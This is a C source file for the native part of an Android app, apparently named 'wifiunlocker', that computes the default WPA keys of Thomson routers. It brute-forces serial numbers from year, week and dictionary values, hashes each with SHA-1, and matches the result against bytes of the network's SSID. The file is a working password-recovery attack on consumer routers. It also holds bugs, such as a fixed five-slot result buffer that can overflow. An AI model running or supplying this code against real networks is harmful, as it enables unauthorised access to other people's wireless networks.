#include "org_exobel_routerkeygen_NativeThomson.h"
#include <ctype.h>
#include <string.h>
#include "sha.h"
#include "unknown.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <android/log.h>

JNIEXPORT jobjectArray JNICALL Java_com_zenkun_wifiunlocker_NativeThomson_thomson
  (JNIEnv * env, jobject obj, jbyteArray ess )
{
    int n = sizeof(dic)/sizeof("AAA");
    jclass cls = (*env)->GetObjectClass(env, obj);
    jfieldID fid_s = (*env)->GetFieldID(env, cls, "stopRequested", "Z");
    if ( fid_s == NULL ) {
        return; /* exception already thrown */
    }
    unsigned char stop = (*env)->GetBooleanField(env, obj, fid_s);
    jbyte *e_native= (*env)->GetByteArrayElements(env, ess, 0);
    uint8_t ssid[3];
    ssid[0] = e_native[0];
    ssid[1] = e_native[1];
    ssid[2] = e_native[2];
	uint8_t message_digest[20];
	SHA_CTX sha1;
	int year = 4;
	int week = 1;
	int i = 0 ;
	char  debug[80];
	char input[13];
	input[0] = 'C';
	input[1] = 'P';
	input[2] = '0';
	char result[5][11];
	int keys = 0;
	for( i = 0; i < n; ++i  )
	{
		sprintf( (&input[0]) + 6, "%02X%02X%02X" , (int)dic[i][0]
		                        , (int)dic[i][1], (int)dic[i][2] );
		stop = (*env)->GetBooleanField(env, obj, fid_s);
		if ( stop )
		{
			(*env)->ReleaseByteArrayElements(env, ess, e_native, 0);
			return;
		}
		for ( year = 4 ; year <= 9 ; ++year )
		{
		    for ( week = 1 ; week <= 52 ; ++week )
		    {
		        input[3] = '0' + year % 10 ;
		        input[4] = '0' + week / 10;
		        input[5] = '0' + week % 10;
		        SHA1_Init(&sha1);
		        SHA1_Update(&sha1 ,(const void *) input , 12 );
		        SHA1_Final(message_digest , &sha1 );
		        if( ( memcmp(&message_digest[17],&ssid[0],3) == 0) ){
		        sprintf( result[keys++], "%02X%02X%02X%02X%02X\0" , message_digest[0], message_digest[1] ,
                                        message_digest[2] , message_digest[3], message_digest[4] ); 
		        }
		    }
		}
	}
	jobjectArray ret;
	ret= (jobjectArray)(*env)->NewObjectArray(env,keys, (*env)->FindClass(env,"java/lang/String"),0);
	for ( i = 0; i < keys ; ++i )
		(*env)->SetObjectArrayElement(env,ret,i,(*env)->NewStringUTF(env, result[i]));
	(*env)->ReleaseByteArrayElements(env, ess, e_native, 0);
 	return ret;
}
